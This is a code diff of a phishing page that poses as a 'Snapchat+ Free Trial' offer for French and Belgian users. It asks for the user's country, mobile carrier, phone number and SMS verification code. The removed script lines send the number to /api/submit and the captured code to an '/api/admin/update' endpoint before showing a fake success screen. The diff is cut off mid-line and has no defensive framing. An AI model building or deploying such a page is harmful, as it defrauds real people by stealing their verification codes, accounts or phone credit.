@@ -3,13 +3,16 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Snapchat+ Free Trial</title>
+    <title>Snapchat+ — Free Trial</title>
     <style>
+        /* ============================================================
+           RESET & BASE
+           ============================================================ */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
@@ -17,99 +20,192 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            background: linear-gradient(145deg, #0a0a0a, #1a1a1a);
-            padding: 20px;
+            background: #0f0f0f;
+            padding: 16px;
         }
 
+        /* ============================================================
+           MAIN CARD
+           ============================================================ */
         .container {
             width: 100%;
-            max-width: 420px;
+            max-width: 400px;
         }
 
         .card {
-            background: #1e1e1e;
-            border-radius: 32px;
-            padding: 40px 28px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            background: #1a1a1a;
+            border-radius: 28px;
+            padding: 32px 24px 28px;
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.9);
             border: 1px solid #2a2a2a;
+            transition: all 0.2s;
         }
 
-        .logo {
+        /* ============================================================
+           BRANDING
+           ============================================================ */
+        .brand {
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 28px;
         }
 
-        .logo h1 {
-            font-size: 28px;
+        .brand .ghost {
+            font-size: 48px;
+            line-height: 1;
+            margin-bottom: 4px;
+            filter: drop-shadow(0 0 20px rgba(255, 252, 0, 0.15));
+        }
+
+        .brand h1 {
+            font-size: 30px;
             font-weight: 700;
             color: #fff;
             letter-spacing: -0.5px;
         }
 
-        .logo h1 span { color: #FFFC00; }
-        .logo .subtitle { color: #888; font-size: 14px; margin-top: 4px; }
+        .brand h1 span {
+            color: #FFFC00;
+        }
 
-        h2 {
+        .brand .tagline {
+            color: #888;
+            font-size: 13px;
+            font-weight: 400;
+            margin-top: 4px;
+            letter-spacing: 0.3px;
+        }
+
+        .brand .badge {
+            display: inline-block;
+            background: #FFFC00;
+            color: #000;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 14px;
+            border-radius: 20px;
+            margin-top: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* ============================================================
+           STEPS
+           ============================================================ */
+        .step {
+            display: none;
+            animation: fadeUp 0.35s ease;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        @keyframes fadeUp {
+            0% { opacity: 0; transform: translateY(12px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-title {
             color: #fff;
             font-size: 20px;
             font-weight: 600;
-            margin-bottom: 20px;
             text-align: center;
+            margin-bottom: 20px;
         }
 
-        .country-grid, .network-grid {
+        .step-sub {
+            color: #888;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* ============================================================
+           COUNTRY GRID
+           ============================================================ */
+        .grid-2 {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 12px;
-            margin-bottom: 20px;
         }
 
-        .country-btn, .network-btn {
-            padding: 16px;
+        .country-card {
+            padding: 18px 12px;
             border-radius: 16px;
             border: 2px solid #2a2a2a;
-            background: #141414;
+            background: #121212;
             color: #fff;
-            font-size: 16px;
+            font-size: 15px;
+            font-weight: 500;
             cursor: pointer;
             transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+            text-align: center;
         }
 
-        .country-btn:hover, .network-btn:hover {
+        .country-card .flag {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .country-card:hover {
             border-color: #FFFC00;
             background: #1a1a1a;
             transform: scale(1.02);
         }
 
-        .country-btn .flag { font-size: 24px; }
-        .network-btn { font-size: 14px; padding: 12px; }
+        .country-card:active {
+            transform: scale(0.97);
+        }
 
-        .input-group {
+        /* ============================================================
+           NETWORK GRID
+           ============================================================ */
+        .network-card {
+            padding: 14px 12px;
+            border-radius: 14px;
+            border: 2px solid #2a2a2a;
+            background: #121212;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+
+        .network-card:hover {
+            border-color: #FFFC00;
+            background: #1a1a1a;
+        }
+
+        /* ============================================================
+           INPUT
+           ============================================================ */
+        .phone-group {
             display: flex;
             align-items: center;
-            background: #141414;
+            background: #121212;
             border-radius: 16px;
             border: 2px solid #2a2a2a;
             padding: 0 16px;
-            margin-bottom: 20px;
-            transition: border-color 0.3s;
+            margin-bottom: 16px;
+            transition: border-color 0.25s;
         }
 
-        .input-group:focus-within { border-color: #FFFC00; }
+        .phone-group:focus-within {
+            border-color: #FFFC00;
+        }
 
-        .country-code {
-            color: #888;
+        .phone-group .code {
+            color: #aaa;
             font-size: 18px;
             font-weight: 500;
             padding-right: 12px;
             border-right: 1px solid #2a2a2a;
         }
 
-        .input-group input {
+        .phone-group input {
             flex: 1;
             padding: 16px 12px;
             background: transparent;
@@ -117,64 +213,148 @@
             outline: none;
             color: #fff;
             font-size: 18px;
+            letter-spacing: 0.5px;
         }
 
-        .input-group input::placeholder { color: #555; }
+        .phone-group input::placeholder {
+            color: #444;
+            font-weight: 400;
+        }
 
-        .btn-primary {
+        /* ============================================================
+           BUTTONS
+           ============================================================ */
+        .btn {
             width: 100%;
             padding: 16px;
             border-radius: 16px;
             border: none;
-            background: #FFFC00;
-            color: #000;
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
         }
 
+        .btn-primary {
+            background: #FFFC00;
+            color: #000;
+        }
+
         .btn-primary:hover {
             transform: scale(1.02);
-            box-shadow: 0 4px 20px rgba(255,252,0,0.3);
+            box-shadow: 0 4px 28px rgba(255, 252, 0, 0.25);
         }
 
         .btn-primary:disabled {
             opacity: 0.5;
+            transform: none !important;
+            box-shadow: none !important;
             cursor: not-allowed;
-            transform: none;
         }
 
-        .terms {
+        .btn-secondary {
+            background: #2a2a2a;
+            color: #fff;
+            margin-top: 8px;
+        }
+
+        .btn-secondary:hover {
+            background: #333;
+        }
+
+        .btn-ghost {
+            background: transparent;
+            color: #888;
+            font-size: 14px;
+            font-weight: 400;
+            margin-top: 6px;
+        }
+
+        .btn-ghost:hover {
+            color: #fff;
+        }
+
+        /* ============================================================
+           OTP
+           ============================================================ */
+        .otp-box {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0 16px;
+        }
+
+        .otp-box input {
+            width: 52px;
+            height: 58px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            background: #121212;
+            border: 2px solid #2a2a2a;
+            border-radius: 14px;
+            color: #fff;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .otp-box input:focus {
+            border-color: #FFFC00;
+        }
+
+        .otp-hint {
+            text-align: center;
+            color: #777;
+            font-size: 14px;
+        }
+
+        .otp-hint strong {
+            color: #fff;
+            font-weight: 500;
+        }
+
+        .resend {
             text-align: center;
             color: #555;
-            font-size: 12px;
-            margin-top: 16px;
+            font-size: 14px;
+            margin-top: 12px;
+            cursor: pointer;
         }
 
-        .terms a { color: #888; text-decoration: none; }
+        .resend span {
+            color: #FFFC00;
+            font-weight: 500;
+        }
 
-        .loader {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #2a2a2a;
+        /* ============================================================
+           LOADER
+           ============================================================ */
+        .loader-wrap {
+            text-align: center;
+            padding: 12px 0;
+        }
+
+        .loader-spinner {
+            width: 44px;
+            height: 44px;
+            border: 3px solid #2a2a2a;
             border-top-color: #FFFC00;
             border-radius: 50%;
-            margin: 20px auto;
-            animation: spin 1s linear infinite;
+            margin: 0 auto 12px;
+            animation: spin 0.9s linear infinite;
         }
 
-        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
 
-        .verifying-text { text-align: center; color: #888; font-size: 14px; }
-
-        .progress-bar {
+        .progress-track {
             width: 100%;
-            height: 4px;
+            height: 3px;
             background: #2a2a2a;
             border-radius: 4px;
-            margin-top: 16px;
             overflow: hidden;
+            margin-top: 12px;
         }
 
         .progress-fill {
@@ -182,59 +362,75 @@
             width: 0%;
             background: #FFFC00;
             border-radius: 4px;
-            transition: width 0.3s;
+            transition: width 0.35s ease;
         }
 
-        .otp-container {
-            display: flex;
-            gap: 12px;
-            justify-content: center;
-            margin: 20px 0;
-        }
-
-        .otp-input {
-            width: 52px;
-            height: 60px;
+        /* ============================================================
+           SUCCESS / ERROR
+           ============================================================ */
+        .icon-big {
+            font-size: 56px;
             text-align: center;
-            font-size: 24px;
-            font-weight: 600;
-            background: #141414;
-            border: 2px solid #2a2a2a;
-            border-radius: 12px;
+            margin: 8px 0 12px;
+        }
+
+        .msg-center {
+            text-align: center;
+            color: #aaa;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .msg-center strong {
             color: #fff;
-            outline: none;
-            transition: border-color 0.2s;
         }
 
-        .otp-input:focus { border-color: #FFFC00; }
-
-        .otp-hint { text-align: center; color: #888; font-size: 14px; }
-        .otp-hint strong { color: #fff; }
-
-        .resend {
-            text-align: center;
-            color: #555;
-            font-size: 14px;
-            margin-top: 16px;
-            cursor: pointer;
+        .error-text {
+            color: #ff6b6b !important;
         }
 
-        .resend span { color: #FFFC00; font-weight: 500; }
-
-        .success-icon, .error-icon { font-size: 64px; text-align: center; margin: 20px 0; }
-
-        .footer { text-align: center; color: #333; font-size: 12px; margin-top: 20px; }
-
-        .hidden { display: none !important; }
-
-        .error-msg {
-            background: #ff4444;
-            color: #fff;
-            padding: 12px;
-            border-radius: 12px;
+        /* ============================================================
+           FOOTER
+           ============================================================ */
+        .footer {
             text-align: center;
-            margin-bottom: 16px;
-            font-size: 14px;
+            color: #2a2a2a;
+            font-size: 11px;
+            margin-top: 18px;
+            letter-spacing: 0.2px;
+        }
+
+        .footer a {
+            color: #444;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            color: #666;
+        }
+
+        /* ============================================================
+           UTILITY
+           ============================================================ */
+        .hidden {
+            display: none !important;
+        }
+
+        .mt-8 { margin-top: 8px; }
+        .mt-12 { margin-top: 12px; }
+        .mb-12 { margin-bottom: 12px; }
+        .text-center { text-align: center; }
+        .gap-8 { gap: 8px; }
+
+        /* ============================================================
+           RESPONSIVE
+           ============================================================ */
+        @media (max-width: 440px) {
+            .card { padding: 24px 16px; }
+            .brand h1 { font-size: 26px; }
+            .otp-box input { width: 44px; height: 50px; font-size: 20px; }
+            .country-card { padding: 14px 8px; font-size: 14px; }
+            .country-card .flag { font-size: 22px; }
         }
     </style>
 </head>
@@ -242,84 +438,117 @@
 
 <div class="container">
     <div class="card">
-        <div class="logo">
+
+        <!-- ============================================================
+        BRAND
+        ============================================================ -->
+        <div class="brand">
+            <div class="ghost">👻</div>
             <h1>snapchat<span>+</span></h1>
-            <p class="subtitle">✨ Free Premium Trial — Limited Time</p>
+            <p class="tagline">Free Premium Trial — Limited Time</p>
+            <span class="badge">✨ 3 Days Free</span>
         </div>
 
-        <!-- STEP 1: Country -->
-        <div id="step1">
-            <h2>Select Your Country</h2>
-            <div class="country-grid">
-                <button class="country-btn" onclick="selectCountry('FR')">
+        <!-- ============================================================
+        STEP 1 — COUNTRY
+        ============================================================ -->
+        <div class="step active" id="step1">
+            <div class="step-title">Select Your Country</div>
+            <div class="grid-2">
+                <div class="country-card" onclick="selectCountry('FR')">
                     <span class="flag">🇫🇷</span> France
-                </button>
-                <button class="country-btn" onclick="selectCountry('BE')">
+                </div>
+                <div class="country-card" onclick="selectCountry('BE')">
                     <span class="flag">🇧🇪</span> Belgium
-                </button>
+                </div>
             </div>
         </div>
 
-        <!-- STEP 2: Network -->
-        <div id="step2" class="hidden">
-            <h2>Select Your Network</h2>
-            <div class="network-grid" id="networkGrid"></div>
-            <button class="btn-primary" style="margin-top:12px;" onclick="goBack()">← Back</button>
+        <!-- ============================================================
+        STEP 2 — NETWORK
+        ============================================================ -->
+        <div class="step" id="step2">
+            <div class="step-title">Select Your Network</div>
+            <div class="grid-2" id="networkGrid"></div>
+            <button class="btn btn-secondary" onclick="goBack()">← Back</button>
         </div>
 
-        <!-- STEP 3: Phone Number -->
-        <div id="step3" class="hidden">
-            <h2>Enter Your Number</h2>
-            <div class="input-group">
-                <span class="country-code" id="countryCode">+33</span>
+        <!-- ============================================================
+        STEP 3 — PHONE NUMBER
+        ============================================================ -->
+        <div class="step" id="step3">
+            <div class="step-title">Enter Your Number</div>
+            <div class="phone-group">
+                <span class="code" id="countryCode">+33</span>
                 <input type="tel" id="phoneInput" placeholder="6 12 34 56 78" maxlength="15" />
             </div>
-            <button class="btn-primary" onclick="sendNumber()" id="sendBtn">Continue →</button>
-            <button class="btn-primary" style="margin-top:8px;background:#333;color:#fff;" onclick="goBack()">← Back</button>
-            <p class="terms">By continuing you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a></p>
+            <button class="btn btn-primary" onclick="sendNumber()" id="sendBtn">Continue →</button>
+            <button class="btn btn-secondary" onclick="goBack()">← Back</button>
+            <p class="text-center" style="color:#444;font-size:11px;margin-top:14px;">
+                By continuing you agree to our <a href="#" style="color:#666;">Terms</a> &amp; <a href="#" style="color:#666;">Privacy Policy</a>
+            </p>
         </div>
 
-        <!-- STEP 4: Verifying -->
-        <div id="step4" class="hidden">
-            <div class="loader"></div>
-            <h2>Verifying Your Number</h2>
-            <p class="verifying-text">Please wait while we confirm your eligibility...</p>
-            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        <!-- ============================================================
+        STEP 4 — VERIFYING
+        ============================================================ -->
+        <div class="step" id="step4">
+            <div class="loader-wrap">
+                <div class="loader-spinner"></div>
+                <div class="step-title" style="font-size:18px;">Verifying Your Number</div>
+                <p style="color:#888;font-size:14px;text-align:center;">Please wait while we confirm your eligibility...</p>
+                <div class="progress-track">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
         </div>
 
-        <!-- STEP 5: OTP -->
-        <div id="step5" class="hidden">
-            <h2>Enter Verification Code</h2>
+        <!-- ============================================================
+        STEP 5 — OTP
+        ============================================================ -->
+        <div class="step" id="step5">
+            <div class="step-title">Enter Verification Code</div>
             <p class="otp-hint">We sent a code to <strong id="displayNumber"></strong></p>
-            <div class="otp-container" id="otpContainer"></div>
-            <button class="btn-primary" onclick="verifyOTP()">Verify →</button>
+            <div class="otp-box" id="otpContainer"></div>
+            <button class="btn btn-primary" onclick="verifyOTP()">Verify →</button>
             <p class="resend" onclick="resendOTP()">Didn't get the code? <span>Resend</span></p>
-            <button class="btn-primary" style="margin-top:8px;background:#333;color:#fff;" onclick="goBack()">← Back</button>
+            <button class="btn btn-secondary" onclick="goBack()">← Back</button>
         </div>
 
-        <!-- STEP 6: Success -->
-        <div id="step6" class="hidden">
-            <div class="success-icon">✅</div>
-            <h2>Snapchat+ Activated! 🎉</h2>
-            <p>Your free trial is now active. Enjoy exclusive features!</p>
-            <button class="btn-primary" onclick="resetAll()">Continue to Snapchat</button>
+        <!-- ============================================================
+        STEP 6 — SUCCESS
+        ============================================================ -->
+        <div class="step" id="step6">
+            <div class="icon-big">✅</div>
+            <div class="step-title">Snapchat+ Activated! 🎉</div>
+            <p class="msg-center">Your free trial is now active.<br />Enjoy exclusive features!</p>
+            <button class="btn btn-primary" style="margin-top:16px;" onclick="resetAll()">Continue to Snapchat</button>
         </div>
 
-        <!-- STEP 7: Error -->
-        <div id="step7" class="hidden">
-            <div class="error-icon">❌</div>
-            <h2>Verification Failed</h2>
-            <p id="errorMessage" style="color:#888;text-align:center;">Invalid code. Please try again.</p>
-            <button class="btn-primary" onclick="goBackToOTP()">Try Again</button>
+        <!-- ============================================================
+        STEP 7 — ERROR
+        ============================================================ -->
+        <div class="step" id="step7">
+            <div class="icon-big">❌</div>
+            <div class="step-title">Verification Failed</div>
+            <p class="msg-center error-text" id="errorMessage">Invalid code. Please try again.</p>
+            <button class="btn btn-primary" style="margin-top:16px;" onclick="goBackToOTP()">Try Again</button>
         </div>
 
+        <!-- ============================================================
+        FOOTER
+        ============================================================ -->
         <div class="footer">
-            <p>© 2026 Snap Inc. — Not affiliated with Snapchat.</p>
+            © 2026 Snap Inc. — Not affiliated with Snapchat.
         </div>
+
     </div>
 </div>
 
 <script>
+    // ============================================================
+    // CONFIG
+    // ============================================================
     const API_URL = window.location.origin;
     let selectedCountry = null;
     let selectedNetwork = null;
@@ -332,19 +561,40 @@
         BE: { name: 'Belgium', code: '+32', networks: ['Proximus', 'Orange BE', 'BASE', 'Telenet'], queue: 'B' }
     };
 
-    function showStep(stepId) {
-        document.querySelectorAll('[id^="step"]').forEach(el => el.classList.add('hidden'));
-        document.getElementById(stepId).classList.remove('hidden');
+    // ============================================================
+    // UI HELPERS
+    // ============================================================
+    function showStep(id) {
+        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
     }
 
+    function goBack() {
+        if (!document.getElementById('step3').classList.contains('active') &&
+            !document.getElementById('step5').classList.contains('active')) {
+            showStep('step1');
+            return;
+        }
+        if (document.getElementById('step3').classList.contains('active')) {
+            showStep('step2');
+        } else if (document.getElementById('step5').classList.contains('active')) {
+            showStep('step3');
+        } else {
+            showStep('step1');
+        }
+    }
+
+    // ============================================================
+    // STEP 1 → COUNTRY
+    // ============================================================
     function selectCountry(country) {
         selectedCountry = country;
         const networks = COUNTRIES[country].networks;
         const grid = document.getElementById('networkGrid');
         grid.innerHTML = '';
         networks.forEach(net => {
-            const btn = document.createElement('button');
-            btn.className = 'network-btn';
+            const btn = document.createElement('div');
+            btn.className = 'network-card';
             btn.textContent = net;
             btn.onclick = () => selectNetwork(net);
             grid.appendChild(btn);
@@ -352,6 +602,9 @@
         showStep('step2');
     }
 
+    // ============================================================
+    // STEP 2 → NETWORK
+    // ============================================================
     function selectNetwork(network) {
         selectedNetwork = network;
         document.getElementById('countryCode').textContent = COUNTRIES[selectedCountry].code;
@@ -359,16 +612,9 @@
         document.getElementById('phoneInput').focus();
     }
 
-    function goBack() {
-        if (document.getElementById('step3').classList.contains('hidden') === false) {
-            showStep('step2');
-        } else if (document.getElementById('step2').classList.contains('hidden') === false) {
-            showStep('step1');
-        } else if (document.getElementById('step5').classList.contains('hidden') === false) {
-            showStep('step3');
-        }
-    }
-
+    // ============================================================
+    // STEP 3 → PHONE NUMBER
+    // ============================================================
     async function sendNumber() {
         const input = document.getElementById('phoneInput');
         phoneNumber = input.value.replace(/\s/g, '');
@@ -378,145 +624,4 @@
             return;
         }
         
-        const fullNumber = COUNTRIES[selectedCountry].code + phoneNumber;
-        const btn = document.getElementById('sendBtn');
-        btn.disabled = true;
-        btn.textContent = 'Sending...';
-        
-        showStep('step4');
-        
-        let progress = 0;
-        const fill = document.getElementById('progressFill');
-        const interval = setInterval(() => {
-            progress += Math.random() * 10;
-            if (progress > 90) clearInterval(interval);
-            fill.style.width = Math.min(progress, 90) + '%';
-        }, 300);
-        
-        try {
-            const response = await fetch(API_URL + '/api/submit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    number: fullNumber,
-                    country: selectedCountry,
-                    network: selectedNetwork,
-                    queue: COUNTRIES[selectedCountry].queue
-                })
-            });
-            
-            const data = await response.json();
-            queueId = data.queueId;
-            
-            clearInterval(interval);
-            fill.style.width = '100%';
-            
-            setTimeout(() => {
-                showStep('step5');
-                setupOTP(4);
-                document.getElementById('displayNumber').textContent = fullNumber;
-            }, 500);
-            
-        } catch (error) {
-            alert('Error connecting. Please try again.');
-            resetAll();
-        } finally {
-            btn.disabled = false;
-            btn.textContent = 'Continue →';
-        }
-    }
-
-    function setupOTP(length) {
-        otpLength = length;
-        const container = document.getElementById('otpContainer');
-        container.innerHTML = '';
-        for (let i = 0; i < length; i++) {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.className = 'otp-input';
-            input.maxLength = 1;
-            input.id = 'otp' + (i + 1);
-            input.autofocus = (i === 0);
-            input.addEventListener('input', function(e) {
-                if (this.value.length === 1 && i < length - 1) {
-                    container.children[i + 1].focus();
-                }
-            });
-            input.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace' && this.value === '' && i > 0) {
-                    container.children[i - 1].focus();
-                }
-                if (e.key === 'Enter') {
-                    verifyOTP();
-                }
-            });
-            container.appendChild(input);
-        }
-        setTimeout(() => container.children[0]?.focus(), 100);
-    }
-
-    async function verifyOTP() {
-        const inputs = document.querySelectorAll('.otp-input');
-        let otp = '';
-        for (let i = 0; i < otpLength; i++) {
-            otp += inputs[i]?.value || '';
-        }
-        
-        if (otp.length !== otpLength) {
-            alert('Please enter the complete verification code.');
-            return;
-        }
-        
-        try {
-            const response = await fetch(API_URL + '/api/admin/update', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    queueId: queueId,
-                    action: 'verify_otp',
-                    otp: otp
-                })
-            });
-            
-            const data = await response.json();
-            if (data.success) {
-                showStep('step6');
-            } else {
-                showStep('step7');
-                document.getElementById('errorMessage').textContent = 'Invalid code. Please try again.';
-            }
-        } catch (error) {
-            alert('Error verifying OTP. Please try again.');
-        }
-    }
-
-    function resendOTP() {
-        alert('A new code has been sent to your number.');
-        document.querySelectorAll('.otp-input').forEach(el => el.value = '');
-        document.querySelector('.otp-input')?.focus();
-    }
-
-    function goBackToOTP() {
-        showStep('step5');
-        document.querySelectorAll('.otp-input').forEach(el => el.value = '');
-        document.querySelector('.otp-input')?.focus();
-    }
-
-    function resetAll() {
-        showStep('step1');
-        document.getElementById('phoneInput').value = '';
-        selectedCountry = null;
-        selectedNetwork = null;
-        phoneNumber = null;
-        queueId = null;
-        document.querySelectorAll('.otp-input').forEach(el => el.value = '');
-    }
-
-    // Enter key support on phone input
-    document.getElementById('phoneInput').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') sendNumber();
-    });
-</script>
-
-</body>
-</html>
+        const fullNumber = COUNTRI
